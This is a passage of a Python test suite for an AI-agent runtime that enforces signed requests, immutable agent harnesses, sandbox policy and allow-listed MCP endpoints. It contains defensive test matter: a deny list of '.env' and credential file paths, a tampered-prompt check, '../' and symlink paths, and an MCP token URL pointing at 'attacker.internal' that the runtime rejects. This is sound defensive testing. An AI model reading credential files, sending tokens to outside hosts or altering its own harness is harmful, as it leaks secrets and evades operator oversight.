from __future__ import annotations

import asyncio
import hashlib
import hmac
import json
import shutil
import time
from dataclasses import replace
from pathlib import Path
from types import SimpleNamespace
from typing import cast

import httpx
import pytest
from agentscope.app.message_bus import InMemoryMessageBus
from agentscope.app.storage import AsyncSQLAlchemyStorage, StorageBase
from agentscope.event import ReplyEndEvent, TextBlockDeltaEvent
from agentscope.mcp import MCPClient
from agentscope.message import AssistantMsg
from agentscope.middleware import TracingMiddleware
from agentscope.permission import PermissionBehavior, PermissionContext, PermissionDecision, PermissionMode, PermissionRule
from agentscope.state import AgentState
from agentscope.tool import Bash, FunctionTool, Glob, Grep, Read, ToolChunk, Write
from agentscope.types import ErrorInfo, ErrorType, ReplyFinishedReason
from agentscope_runtime.access_middleware import MAX_RUNTIME_REQUEST_BODY_BYTES, FixedRuntimeUserMiddleware
from agentscope_runtime.context_registry import RuntimeContext, bind_reply_context
from agentscope_runtime.credential_storage import ProvisionedAsyncSQLAlchemyStorage
from agentscope_runtime.harness_evidence_middleware import GovernedHarnessEvidenceMiddleware
from agentscope_runtime.mcp_resource_middleware import MCPResourceMiddleware
from agentscope_runtime.observability import RedactingSpanProcessor
from agentscope_runtime.policy_middleware import AgentGovPolicyMiddleware
from agentscope_runtime.receipt_middleware import CURRENT_RUNTIME_CONTEXT, AgentGovReceiptMiddleware
from agentscope_runtime.run_trace import AgentGovRunTraceRegistry, AgentGovTraceIdGenerator
from agentscope_runtime.service import create_runtime_app
from agentscope_runtime.session_workspace_release import SessionWorkspaceReleaseMiddleware
from agentscope_runtime.settings import RUNTIME_USER_ID, RuntimeSettings
from agentscope_runtime.signing import SIGNATURE_HEADER, TIMESTAMP_HEADER, runtime_gateway_headers, signed_headers
from agentscope_runtime.subagent_templates import discover_subagent_templates, load_subagent_templates
from agentscope_runtime.trace_context_middleware import AgentGovTraceContextMiddleware
from agentscope_runtime.workspace_manager import AgentGovLocalWorkspace, AgentGovWorkspaceManager, harness_digest
from fastapi import FastAPI
from fastapi.testclient import TestClient
from opentelemetry import trace as otel_trace
from opentelemetry.sdk.trace import TracerProvider
from opentelemetry.sdk.trace.export import SimpleSpanProcessor
from opentelemetry.sdk.trace.export.in_memory_span_exporter import InMemorySpanExporter
from starlette.types import Message, Receive, Scope, Send


def _settings(tmp_path: Path) -> RuntimeSettings:
    data_dir = tmp_path / "data"
    business_root = tmp_path / "business"
    candidates_root = tmp_path / "candidates"
    workspaces_root = tmp_path / "workspaces"
    for path in (business_root, candidates_root, workspaces_root):
        path.mkdir()
    return RuntimeSettings(
        shared_secret="shared-test-secret",
        provider_api_key="provider-test-secret",
        agentgov_api_base_url="http://agent-gov-api:8080",
        provider_api_url="http://model-provider.test/v1",
        data_dir=data_dir,
        business_agents_root=business_root,
        candidates_root=candidates_root,
        workspaces_root=workspaces_root,
        database_url=f"sqlite+aiosqlite:///{data_dir / 'agentscope.db'}",
    )


@pytest.fixture(autouse=True)
def _stub_slow_bubblewrap_bootstrap(monkeypatch: pytest.MonkeyPatch) -> None:
    """单元测试只验证编排；真实 bwrap 由容器 smoke 覆盖。"""

    async def initialize(workspace) -> None:
        workspace.is_alive = True

    async def add_mcp(workspace, client, *, agent_id=None, session_id=None) -> None:
        key = (agent_id or "", session_id or "")
        workspace.__dict__.setdefault("_test_mcps", {}).setdefault(key, {})[client.name] = client

    async def list_mcps(workspace, *, agent_id=None, session_id=None):
        key = (agent_id or "", session_id or "")
        declared = workspace.__dict__.get("_test_mcps", {}).get(key)
        if declared is None:
            return list(workspace.default_mcps)
        return list(declared.values())

    async def validate_live_mcp_tools(*args, **kwargs) -> None:
        del args, kwargs

    monkeypatch.setattr(AgentGovLocalWorkspace, "initialize", initialize)
    monkeypatch.setattr("agentscope_runtime.offline_gateway.prepare_offline_gateway", lambda _: None)
    monkeypatch.setattr(AgentGovLocalWorkspace, "add_mcp", add_mcp)
    monkeypatch.setattr(AgentGovLocalWorkspace, "list_mcps", list_mcps)
    monkeypatch.setattr(AgentGovWorkspaceManager, "_validate_live_mcp_tools", validate_live_mcp_tools)


def _manager(
    settings: RuntimeSettings,
    *,
    environ: dict[str, str] | None = None,
) -> AgentGovWorkspaceManager:
    return AgentGovWorkspaceManager(
        business_agents_root=settings.business_agents_root,
        candidates_root=settings.candidates_root,
        workspaces_root=settings.workspaces_root,
        environ=environ,
    )


class _WorkspaceReferenceStorage:
    """Minimal public storage surface needed by Workspace release tests."""

    def __init__(self, sessions_by_agent: dict[str, list[SimpleNamespace]]) -> None:
        self.sessions_by_agent = sessions_by_agent

    async def list_agents(self, user_id: str) -> list[SimpleNamespace]:
        del user_id
        return [SimpleNamespace(id=agent_id) for agent_id in self.sessions_by_agent]

    async def list_sessions(
        self,
        user_id: str,
        agent_id: str,
    ) -> list[SimpleNamespace]:
        del user_id
        return list(self.sessions_by_agent.get(agent_id, []))


def _workspace_session(
    session_id: str,
    workspace_id: str,
) -> SimpleNamespace:
    return SimpleNamespace(
        id=session_id,
        config=SimpleNamespace(workspace_id=workspace_id),
    )


def _session_delete_client(
    manager: AgentGovWorkspaceManager,
    storage: _WorkspaceReferenceStorage,
    *,
    status_code: int,
) -> TestClient:
    async def delete_app(scope: Scope, receive: Receive, send: Send) -> None:
        del receive
        if status_code in {204, 500}:
            session_id = scope["path"].removeprefix("/sessions/")
            for sessions in storage.sessions_by_agent.values():
                sessions[:] = [session for session in sessions if session.id != session_id]
        await send(
            {
                "type": "http.response.start",
                "status": status_code,
                "headers": [],
            },
        )
        await send({"type": "http.response.body", "body": b""})

    return TestClient(
        SessionWorkspaceReleaseMiddleware(
            delete_app,
            workspace_manager=manager,
        ),
    )


def _runtime_context_payload() -> dict[str, object]:
    return {
        "run_id": "run-1",
        "session_id": "session-1",
        "root_session_id": "session-1",
        "role": "root",
        "agent_id": "agent-1",
        "agent_version_id": "version-1",
        "runtime_agent_id": "runtime-agent-1",
        "harness_digest": "e" * 64,
        "trace_id": "1" * 32,
        "team_generation": 0,
    }


def _receipt_ack(run_id: str, *, status: str = "finalizing", terminal_reason: str | None = None) -> httpx.Response:
    return httpx.Response(
        200,
        json={"run_id": run_id, "status": status, "terminal_reason": terminal_reason},
    )


def _runtime_headers(settings: RuntimeSettings, method: str, path: str, body: bytes = b"") -> dict[str, str]:
    timestamp = f"{time.time_ns() / 1_000_000_000:.9f}"
    return {
        "X-User-ID": RUNTIME_USER_ID,
        **runtime_gateway_headers(
            settings.shared_secret,
            RUNTIME_USER_ID,
            method,
            path,
            body,
            timestamp=timestamp,
        ),
    }


def _runtime_json(client: TestClient, settings: RuntimeSettings, method: str, path: str, payload: object):
    body = json.dumps(payload, ensure_ascii=False, separators=(",", ":"), sort_keys=True).encode()
    headers = _runtime_headers(settings, method, path, body)
    headers["Content-Type"] = "application/json"
    return client.request(method, path, content=body, headers=headers)


def _write_harness(
    root: Path,
    agent_id: str,
    digest: str,
    *,
    report: bool = True,
) -> Path:
    workspace = root / agent_id / "workspace"
    workspace.mkdir(parents=True)
    (workspace / "agent.yaml").write_text("schema_version: 1\n", encoding="utf-8")
    if report:
        (workspace / "conversion-report.json").write_text(
            json.dumps(
                {
                    "schema_version": 1,
                    "rejected_count": 0,
                    "harness_digest": digest,
                },
            )
            + "\n",
            encoding="utf-8",
        )
    return workspace


def _write_published_marker(
    workspace: Path,
    digest: str,
    *,
    agent_id: str = "soc-ops",
    agent_version_id: str = "f" * 40,
) -> None:
    snapshot = workspace.parent
    (snapshot / "snapshot.json").write_text(
        json.dumps(
            {
                "schema_version": 1,
                "source_id": snapshot.name,
                "agent_id": agent_id,
                "agent_version_id": agent_version_id,
                "harness_digest": digest,
            },
        ),
        encoding="utf-8",
    )


def _write_policy_manifest(
    workspace: Path,
    *,
    allowed: list[str],
    denied: list[str],
    permission_mode: str = "default",
    denied_read_paths: list[str] | None = None,
    allowed_network_domains: list[str] | None = None,
) -> None:
    workspace.mkdir(parents=True, exist_ok=True)
    (workspace / "agent.yaml").write_text(
        json.dumps(
            {
                "session": {"permission_mode": permission_mode},
                "runtime_middlewares": [
                    {"type": "policy_guard", "phase": "before_tool_call", "fail_closed": True},
                ],
                "workspace_policy": {
                    "fail_closed": True,
                    "immutable_harness": True,
                    "allowed_tools": allowed,
                    "denied_tools": denied,
                    "denied_read_paths": denied_read_paths or [".env", "**/.env", "**/*credential*"],
                    "immutable_paths": ["AGENT.md", "agent.yaml", "skills/**", "mcp/**", "subagents/**"],
                    "writable_paths": ["**"],
                    "allowed_network_domains": allowed_network_domains or [],
                    "sandbox": {
                        "enabled": True,
                        "fail_if_unavailable": True,
                        "allow_unsandboxed_commands": False,
                    },
                },
            },
        ),
        encoding="utf-8",
    )


def test_settings_require_secret_and_absolute_sqlite_paths(tmp_path: Path) -> None:
    with pytest.raises(ValueError, match="SHARED_SECRET"):
        RuntimeSettings.from_env({})
    with pytest.raises(ValueError, match="MODEL_PROVIDER_API_KEY"):
        RuntimeSettings.from_env({"AGENTGOV_RUNTIME_SHARED_SECRET": "secret"})
    with pytest.raises(ValueError, match="proxy environment is forbidden"):
        RuntimeSettings.from_env(
            {
                "AGENTGOV_RUNTIME_SHARED_SECRET": "secret",
                "MODEL_PROVIDER_API_KEY": "provider-secret",
                "HTTPS_PROXY": "http://proxy.invalid:8080",
            },
        )

    settings = RuntimeSettings.from_env(
        {
            "AGENTGOV_RUNTIME_SHARED_SECRET": "secret",
            "MODEL_PROVIDER_API_KEY": "provider-secret",
            "MODEL_PROVIDER_API_URL": "http://model-provider.test/v1/",
            "AGENTGOV_INTERNAL_API_BASE_URL": "http://agent-gov-api:8080/",
            "AGENTSCOPE_RUNTIME_DATA_DIR": str(tmp_path / "data"),
            "AGENTSCOPE_RUNTIME_BUSINESS_AGENTS_ROOT": str(tmp_path / "business"),
            "AGENTSCOPE_RUNTIME_CANDIDATES_ROOT": str(tmp_path / "candidates"),
            "AGENTSCOPE_RUNTIME_WORKSPACES_ROOT": str(tmp_path / "workspaces"),
        },
    )
    assert settings.agentgov_api_base_url == "http://agent-gov-api:8080"
    assert settings.provider_api_url == "http://model-provider.test/v1"
    assert settings.credential_type == "openai_credential"
    assert settings.credential_id == "agentgov-runtime-provider"
    assert settings.database_url == f"sqlite+aiosqlite:///{tmp_path / 'data/agentscope.db'}"
    settings.prepare_writable_directories()
    assert settings.data_dir.is_dir()
    assert settings.workspaces_root.is_dir()
    assert not settings.business_agents_root.exists()
    assert settings.require_read_only_source_mounts is True
    settings.business_agents_root.mkdir()
    settings.candidates_root.mkdir()
    with pytest.raises(ValueError, match="mounted read-only"):
        settings.validate_source_mounts()

    with pytest.raises(ValueError, match="absolute sqlite"):
        RuntimeSettings.from_env(
            {
                "AGENTGOV_RUNTIME_SHARED_SECRET": "secret",
                "MODEL_PROVIDER_API_KEY": "provider-secret",
                "AGENTSCOPE_RUNTIME_DATABASE_URL": "sqlite+aiosqlite:///relative.db",
            },
        )
    with pytest.raises(ValueError, match="must stay inside"):
        RuntimeSettings.from_env(
            {
                "AGENTGOV_RUNTIME_SHARED_SECRET": "secret",
                "MODEL_PROVIDER_API_KEY": "provider-secret",
                "AGENTSCOPE_RUNTIME_DATA_DIR": str(tmp_path / "data"),
                "AGENTSCOPE_RUNTIME_DATABASE_URL": (f"sqlite+aiosqlite:///{tmp_path / 'outside.db'}"),
            },
        )


def test_signing_uses_exact_method_path_and_raw_body() -> None:
    body = b'{"message":"\xe4\xb8\xad\xe6\x96\x87"}'
    headers = signed_headers(
        "secret",
        "post",
        "/internal/runtime-receipts",
        body,
        timestamp="1700000000",
    )
    expected = hmac.new(
        b"secret",
        b"1700000000\nPOST\n/internal/runtime-receipts\n" + body,
        hashlib.sha256,
    ).hexdigest()
    assert headers == {
        TIMESTAMP_HEADER: "1700000000",
        SIGNATURE_HEADER: expected,
    }


def test_fixed_runtime_user_middleware_rejects_missing_wrong_and_ambiguous_headers() -> None:
    app = FastAPI()
    secret = "shared-test-secret"

    @app.get("/health")
    async def health() -> dict[str, str]:
        return {"status": "ok"}

    client = TestClient(
        FixedRuntimeUserMiddleware(app, expected_user_id=RUNTIME_USER_ID, shared_secret=secret),
    )
    assert client.get("/health").status_code == 401
    assert client.get("/health", headers={"X-User-ID": "other"}).status_code == 401
    assert (
        client.get(
            "/health",
            headers=[
                ("X-User-ID", RUNTIME_USER_ID),
                ("X-User-ID", "other"),
            ],
        ).status_code
        == 401
    )
    timestamp = f"{time.time():.6f}"
    authenticated = {
        "X-User-ID": RUNTIME_USER_ID,
        **runtime_gateway_headers(secret, RUNTIME_USER_ID, "GET", "/health", timestamp=timestamp),
    }
    response = client.get("/health", headers=authenticated)
    assert response.status_code == 200
    assert response.json() == {"status": "ok"}
    assert client.get("/health", headers=authenticated).status_code == 401
    expired = {
        "X-User-ID": RUNTIME_USER_ID,
        **runtime_gateway_headers(secret, RUNTIME_USER_ID, "GET", "/health", timestamp="1"),
    }
    assert client.get("/health", headers=expired).status_code == 401
    duplicate_signature = list(authenticated.items()) + [(SIGNATURE_HEADER, authenticated[SIGNATURE_HEADER])]
    assert client.get("/health", headers=duplicate_signature).status_code == 401

    credential_headers = {
        "X-User-ID": RUNTIME_USER_ID,
        **runtime_gateway_headers(
            secret,
            RUNTIME_USER_ID,
            "GET",
            "/credential/",
            timestamp=f"{time.time():.6f}",
        ),
    }
    assert client.get("/credential/", headers=credential_headers).status_code == 403

    query_target = "/sessions/session-1/status?agent_id=agent-a"
    query_headers = {
        "X-User-ID": RUNTIME_USER_ID,
        **runtime_gateway_headers(
            secret,
            RUNTIME_USER_ID,
            "GET",
            query_target,
            timestamp=f"{time.time():.9f}",
        ),
    }
    assert client.get(query_target, headers=query_headers).status_code == 404
    assert (
        client.get(
            "/sessions/session-1/status?agent_id=agent-b",
            headers=query_headers,
        ).status_code
        == 401
    )

    wrong_user_headers = {
        "X-User-ID": RUNTIME_USER_ID,
        **runtime_gateway_headers(
            secret,
            "different-internal-user",
            "GET",
            "/health",
            timestamp=f"{time.time():.9f}",
        ),
    }
    assert client.get("/health", headers=wrong_user_headers).status_code == 401


def test_fixed_runtime_user_rejects_declared_body_before_signature_verification() -> None:
    app = FastAPI()
    client = TestClient(
        FixedRuntimeUserMiddleware(
            app,
            expected_user_id=RUNTIME_USER_ID,
            shared_secret="shared-test-secret",
        ),
    )

    response = client.post("/chat/", content=b"x" * (MAX_RUNTIME_REQUEST_BODY_BYTES + 1))

    assert response.status_code == 413
    assert response.json() == {"detail": "Runtime request body is too large"}


def test_fixed_runtime_user_rejects_chunked_body_over_cumulative_limit() -> None:
    downstream_called = False
    sent: list[dict[str, object]] = []
    requests = iter(
        [
            {"type": "http.request", "body": b"x" * MAX_RUNTIME_REQUEST_BODY_BYTES, "more_body": True},
            {"type": "http.request", "body": b"y", "more_body": False},
        ],
    )

    async def downstream(_scope: Scope, _receive: Receive, _send: Send) -> None:
        nonlocal downstream_called
        downstream_called = True

    async def receive() -> Message:
        return next(requests)  # type: ignore[return-value]

    async def send(message: Message) -> None:
        sent.append(message)

    middleware = FixedRuntimeUserMiddleware(
        downstream,
        expected_user_id=RUNTIME_USER_ID,
        shared_secret="shared-test-secret",
    )
    asyncio.run(
        middleware(
            {
                "type": "http",
                "method": "POST",
                "path": "/chat/",
                "raw_path": b"/chat/",
                "query_string": b"",
                "headers": [],
            },
            receive,
            send,
        ),
    )

    assert downstream_called is False
    assert sent[0]["status"] == 413


def test_workspace_manager_uses_digest_bound_source_and_separate_writable_state(
    tmp_path: Path,
) -> None:
    settings = _settings(tmp_path)
    source = _write_harness(settings.candidates_root, "candidate-soc-ops", "legacy-digest")
    skill = source / "skills/evidence"
    skill.mkdir(parents=True)
    (skill / "SKILL.md").write_text(
        "---\nname: evidence\ndescription: Gather evidence.\n---\n\nUse evidence.\n",
        encoding="utf-8",
    )
    digest = harness_digest(source)
    manager = _manager(settings)
    workspace_id = f"candidate-soc-ops--v-{digest}"
    (source / "agent.yaml").chmod(0o440)

    async def exercise() -> tuple[str, str, bool, list[str]]:
        first = await manager.get_workspace("ignored", "runtime-id", "session", workspace_id)
        second = await manager.get_workspace("ignored", "runtime-id", "session", workspace_id)
        skills = await first.list_skills(agent_id="runtime-id")
        await manager.close_all()
        return first.workdir, first.harness_root, first is second, [item.name for item in skills]

    workdir, harness_root, reused, skill_names = asyncio.run(exercise())
    target = settings.workspaces_root / workspace_id
    assert reused is True
    assert workdir == "/workspace"
    assert harness_root == str(source)
    assert {entry.name for entry in target.iterdir()} == {
        ".agentgov-runtime-cache",
        ".agentgov-runtime-state",
        ".agentgov-runtime-workspace.json",
    }
    assert skill_names == ["evidence"]
    assert json.loads((target / ".agentgov-runtime-workspace.json").read_text()) == {
        "workspace_id": workspace_id,
        "harness_digest": digest,
    }
    assert not (source / ".agentgov-runtime-workspace.json").exists()
    assert sorted(path.name for path in source.iterdir()) == [
        "agent.yaml",
        "conversion-report.json",
        "skills",
    ]
    (source / "AGENT.md").write_text("tampered prompt\n", encoding="utf-8")
    fresh_manager = _manager(settings)
    with pytest.raises(ValueError, match="tree digest"):
        asyncio.run(fresh_manager.get_workspace("u", "a", "s", workspace_id))


def test_session_delete_204_releases_zero_reference_workspace_without_deleting_state(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    settings = _settings(tmp_path)
    source = _write_harness(settings.candidates_root, "candidate-soc-ops", "legacy")
    digest = harness_digest(source)
    workspace_id = f"candidate-soc-ops--v-{digest}"
    storage = _WorkspaceReferenceStorage(
        {"runtime-agent": [_workspace_session("session-1", workspace_id)]},
    )
    manager = _manager(settings)
    manager.bind_storage(cast(StorageBase, storage))
    workspace = asyncio.run(
        manager.get_workspace(
            RUNTIME_USER_ID,
            "runtime-agent",
            "session-1",
            workspace_id,
        ),
    )
    closed: list[str] = []

    async def close_workspace() -> None:
        closed.append(workspace.workspace_id)

    monkeypatch.setattr(workspace, "close", close_workspace)
    response = _session_delete_client(manager, storage, status_code=204).delete(
        "/sessions/session-1?agent_id=runtime-agent",
    )

    assert response.status_code == 204
    assert closed == [workspace_id]
    assert (settings.workspaces_root / workspace_id).is_dir()


def test_session_delete_404_uses_cached_binding_but_500_never_releases(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    settings = _settings(tmp_path)
    source = _write_harness(settings.candidates_root, "candidate-soc-ops", "legacy")
    digest = harness_digest(source)
    workspace_id = f"candidate-soc-ops--v-{digest}"

    async def exercise(status_code: int) -> list[int]:
        storage = _WorkspaceReferenceStorage({"runtime-agent": []})
        manager = _manager(settings)
        manager.bind_storage(cast(StorageBase, storage))
        workspace = await manager.get_workspace(
            RUNTIME_USER_ID,
            "runtime-agent",
            f"session-{status_code}",
            workspace_id,
        )
        closed: list[int] = []

        async def close_workspace() -> None:
            closed.append(status_code)

        monkeypatch.setattr(workspace, "close", close_workspace)
        response = _session_delete_client(
            manager,
            storage,
            status_code=status_code,
        ).delete(
            f"/sessions/session-{status_code}?agent_id=runtime-agent",
        )
        assert response.status_code == status_code
        return closed

    assert asyncio.run(exercise(404)) == [404]
    assert asyncio.run(exercise(500)) == []


def test_session_workspace_close_failure_remains_retryable_via_idempotent_404(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    settings = _settings(tmp_path)
    source = _write_harness(settings.candidates_root, "candidate-soc-ops", "legacy")
    digest = harness_digest(source)
    workspace_id = f"candidate-soc-ops--v-{digest}"
    storage = _WorkspaceReferenceStorage({"runtime-agent": []})
    manager = _manager(settings)
    manager.bind_storage(cast(StorageBase, storage))
    workspace = asyncio.run(
        manager.get_workspace(
            RUNTIME_USER_ID,
            "runtime-agent",
            "session-retry",
            workspace_id,
        ),
    )
    attempts = 0

    async def close_workspace() -> None:
        nonlocal attempts
        attempts += 1
        if attempts == 1:
            raise RuntimeError("transient close failure")

    monkeypatch.setattr(workspace, "close", close_workspace)

    assert (
        _session_delete_client(manager, storage, status_code=204)
        .delete(
            "/sessions/session-retry?agent_id=runtime-agent",
        )
        .status_code
        == 204
    )
    assert attempts == 1
    assert (
        _session_delete_client(manager, storage, status_code=404)
        .delete(
            "/sessions/session-retry?agent_id=runtime-agent",
        )
        .status_code
        == 404
    )
    assert attempts == 2


def test_shared_workspace_is_released_only_after_last_session_delete(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    settings = _settings(tmp_path)
    source = _write_harness(settings.candidates_root, "candidate-soc-ops", "legacy")
    digest = harness_digest(source)
    workspace_id = f"candidate-soc-ops--v-{digest}"
    storage = _WorkspaceReferenceStorage(
        {
            "runtime-agent": [
                _workspace_session("session-1", workspace_id),
                _workspace_session("session-2", workspace_id),
            ],
        },
    )
    manager = _manager(settings)
    manager.bind_storage(cast(StorageBase, storage))

    async def prepare_workspace() -> AgentGovLocalWorkspace:
        first = await manager.get_workspace(
            RUNTIME_USER_ID,
            "runtime-agent",
            "session-1",
            workspace_id,
        )
        second = await manager.get_workspace(
            RUNTIME_USER_ID,
            "runtime-agent",
            "session-2",
            workspace_id,
        )
        assert first is second
        return cast(AgentGovLocalWorkspace, first)

    workspace = asyncio.run(prepare_workspace())
    closed: list[str] = []

    async def close_workspace() -> None:
        closed.append(workspace.workspace_id)

    monkeypatch.setattr(workspace, "close", close_workspace)
    client = _session_delete_client(manager, storage, status_code=204)

    assert client.delete("/sessions/session-1?agent_id=runtime-agent").status_code == 204
    assert closed == []
    assert client.delete("/sessions/session-2?agent_id=runtime-agent").status_code == 204
    assert closed == [workspace_id]


def test_workspace_close_and_get_are_serialized_under_manager_lock(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    settings = _settings(tmp_path)
    source = _write_harness(settings.candidates_root, "candidate-soc-ops", "legacy")
    digest = harness_digest(source)
    workspace_id = f"candidate-soc-ops--v-{digest}"
    storage = _WorkspaceReferenceStorage({"runtime-agent": []})
    manager = _manager(settings)
    manager.bind_storage(cast(StorageBase, storage))

    async def exercise() -> None:
        original = await manager.get_workspace(
            RUNTIME_USER_ID,
            "runtime-agent",
            "deleted-session",
            workspace_id,
        )
        close_started = asyncio.Event()
        allow_close = asyncio.Event()

        async def delayed_close() -> None:
            close_started.set()
            await allow_close.wait()

        monkeypatch.setattr(original, "close", delayed_close)
        release = asyncio.create_task(
            manager.release_session_workspace_if_unreferenced(
                RUNTIME_USER_ID,
                "runtime-agent",
                "deleted-session",
            ),
        )
        await close_started.wait()
        get = asyncio.create_task(
            manager.get_workspace(
                RUNTIME_USER_ID,
                "runtime-agent",
                "new-session",
                workspace_id,
            ),
        )
        await asyncio.sleep(0)
        assert get.done() is False
        allow_close.set()
        assert await release is True
        replacement = await get
        assert replacement is not original
        await manager.close_all()

    asyncio.run(exercise())


def test_workspace_manager_rejects_invalid_binding_report_marker_and_symlink(
    tmp_path: Path,
) -> None:
    settings = _settings(tmp_path)
    source = _write_harness(settings.candidates_root, "candidate-soc-ops", "legacy-digest")
    digest = harness_digest(source)
    manager = _manager(settings)

    with pytest.raises(ValueError, match="workspace_id"):
        asyncio.run(manager.get_workspace("u", "a", "s", "../soc-ops--v-short"))
    with pytest.raises(ValueError, match="tree digest"):
        asyncio.run(manager.get_workspace("u", "a", "s", f"candidate-soc-ops--v-{'b' * 64}"))

    (source / "unsafe-link").symlink_to(source / "agent.yaml")
    with pytest.raises(ValueError, match="symlinks"):
        asyncio.run(manager.get_workspace("u", "a", "s", f"candidate-soc-ops--v-{digest}"))

    (source / "unsafe-link").unlink()
    target = settings.workspaces_root / f"candidate-soc-ops--v-{digest}"
    target.mkdir()
    (target / ".agentgov-runtime-workspace.json").write_text(
        json.dumps({"workspace_id": "wrong", "harness_digest": digest}),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="marker does not match"):
        asyncio.run(manager.get_workspace("u", "a", "s", f"candidate-soc-ops--v-{digest}"))


def test_candidate_workspace_never_falls_back_to_business_root(tmp_path: Path) -> None:
    settings = _settings(tmp_path)
    business = _write_harness(
        settings.business_agents_root,
        "candidate-change-1",
        "legacy-digest",
        report=False,
    )
    digest = harness_digest(business)
    manager = _manager(settings)
    workspace_id = f"candidate-change-1--v-{digest}"

    with pytest.raises(ValueError, match="Harness agent root"):
        asyncio.run(manager.get_workspace("u", "a", "s", workspace_id))

    _write_harness(
        settings.candidates_root,
        "candidate-change-1",
        "legacy-digest",
        report=False,
    )

    async def exercise() -> str:
        workspace = await manager.get_workspace("u", "a", "s", workspace_id)
        await manager.close_all()
        return workspace.workdir

    assert asyncio.run(exercise()) == "/workspace"


def test_live_business_workspace_is_never_a_runtime_version_source(tmp_path: Path) -> None:
    settings = _settings(tmp_path)
    source = _write_harness(settings.business_agents_root, "soc-ops", "live", report=False)
    digest = harness_digest(source)

    with pytest.raises(ValueError, match="Live business Harness sources are forbidden"):
        asyncio.run(
            _manager(settings).get_workspace(
                "u",
                "runtime-agent",
                "session",
                f"soc-ops--v-{digest}",
            ),
        )


def test_published_snapshot_workspace_is_resolved_only_from_candidates_root(tmp_path: Path) -> None:
    settings = _settings(tmp_path)
    source_id = "published-" + "a" * 48
    source = _write_harness(
        settings.candidates_root,
        source_id,
        "legacy-digest",
        report=False,
    )
    digest = harness_digest(source)
    _write_published_marker(source, digest)
    workspace_id = f"{source_id}--v-{digest}"
    manager = _manager(settings)

    async def exercise() -> str:
        workspace = await manager.get_workspace("u", "runtime-agent", "session", workspace_id)
        harness_root = workspace.harness_root
        await manager.close_all()
        return harness_root

    assert asyncio.run(exercise()) == str(source)


def test_published_snapshot_requires_exact_parent_marker(tmp_path: Path) -> None:
    settings = _settings(tmp_path)
    source_id = "published-" + "b" * 48
    source = _write_harness(settings.candidates_root, source_id, "snapshot", report=False)
    digest = harness_digest(source)
    workspace_id = f"{source_id}--v-{digest}"

    with pytest.raises(ValueError, match="marker is missing"):
        asyncio.run(_manager(settings).get_workspace("u", "runtime-agent", "session", workspace_id))

    _write_published_marker(source, "c" * 64)
    with pytest.raises(ValueError, match="does not match"):
        asyncio.run(_manager(settings).get_workspace("u", "runtime-agent", "session", workspace_id))


def test_workspace_manager_materializes_http_mcp_with_scoped_ids_and_env(
    tmp_path: Path,
) -> None:
    settings = _settings(tmp_path)
    source = _write_harness(settings.candidates_root, "candidate-soc-ops", "legacy-digest")
    declaration = {
        "schema_version": 1,
        "name": "sec-ops",
        "credential_refs": [
            {"env": "SEC_OPS_MCP_TOKEN", "path": "mcp_config.headers.Authorization"},
            {"env": "SEC_OPS_MCP_URL", "path": "mcp_config.url"},
        ],
        "mcp_config": {
            "type": "http_mcp",
            "url": "${SEC_OPS_MCP_URL}",
            "headers": {"Authorization": "Bearer ${SEC_OPS_MCP_TOKEN}"},
        },
        "enable_tools": ["soc_api__list_alerts"],
        "enable_resources": ["openapi://soc_api/resp/action-defs"],
        "enable_resource_templates": ["openapi://soc_api/resp/playbooks/{playbook_id}"],
    }
    (source / "mcp").mkdir()
    (source / "mcp/sec-ops.json").write_text(json.dumps(declaration), encoding="utf-8")
    _write_policy_manifest(
        source,
        allowed=["mcp__sec-ops__*"],
        denied=[],
        allowed_network_domains=["${SEC_OPS_MCP_URL}"],
    )
    digest = harness_digest(source)
    manager = _manager(
        settings,
        environ={
            "SEC_OPS_MCP_TOKEN": "mcp-secret",
            "SEC_OPS_MCP_URL": "http://mcp.internal/mcp",
        },
    )
    workspace_id = f"candidate-soc-ops--v-{digest}"

    async def exercise() -> tuple[MCPClient, int]:
        workspace = await manager.get_workspace(
            "ignored",
            "runtime-agent",
            "session-1",
            workspace_id,
        )
        await manager.get_workspace(
            "ignored",
            "runtime-agent",
            "session-1",
            workspace_id,
        )
        clients = await workspace.list_mcps(
            agent_id="runtime-agent",
            session_id="session-1",
        )
        await manager.close_all()
        return clients[0], len(clients)

    client, count = asyncio.run(exercise())
    assert count == 1
    assert client.name == "sec-ops"
    assert client.is_stateful is False
    assert client.mcp_config.url == "http://mcp.internal/mcp"
    assert client.mcp_config.headers == {"Authorization": "Bearer mcp-secret"}
    assert client.enable_tools == ["soc_api__list_alerts"]
    assert "${SEC_OPS_MCP_TOKEN}" in (source / "mcp/sec-ops.json").read_text()
    state_root = settings.workspaces_root / workspace_id / ".agentgov-runtime-state"
    assert not (state_root / ".mcp").exists()
    (state_root / ".mcp").write_text("credential must never persist", encoding="utf-8")
    restarted = _manager(
        settings,
        environ={
            "SEC_OPS_MCP_TOKEN": "mcp-secret",
            "SEC_OPS_MCP_URL": "http://mcp.internal/mcp",
        },
    )
    with pytest.raises(ValueError, match="Persisted \\.mcp is forbidden"):
        asyncio.run(
            restarted.get_workspace(
                "ignored",
                "runtime-agent",
                "session-1",
                workspace_id,
            ),
        )
    (state_root / ".mcp").unlink()

    _write_policy_manifest(
        source,
        allowed=["mcp__sec-ops__*"],
        denied=[],
        allowed_network_domains=["approved.internal"],
    )
    attacker_manager = _manager(
        settings,
        environ={
            "SEC_OPS_MCP_TOKEN": "mcp-secret",
            "SEC_OPS_MCP_URL": "http://attacker.internal/mcp",
        },
    )
    with pytest.raises(ValueError, match="outside workspace_policy"):
        attacker_manager._load_mcp_clients(source)

    userinfo_manager = _manager(
        settings,
        environ={
            "SEC_OPS_MCP_TOKEN": "mcp-secret",
            "SEC_OPS_MCP_URL": "http://user@approved.internal/mcp",
        },
    )
    with pytest.raises(ValueError, match="outside workspace_policy"):
        userinfo_manager._load_mcp_clients(source)

    query_manager = _manager(
        settings,
        environ={
            "SEC_OPS_MCP_TOKEN": "mcp-secret",
            "SEC_OPS_MCP_URL": "http://approved.internal/mcp?tenant=other",
        },
    )
    with pytest.raises(ValueError, match="outside workspace_policy"):
        query_manager._load_mcp_clients(source)

    _write_policy_manifest(
        source,
        allowed=["mcp__sec-ops__*"],
        denied=[],
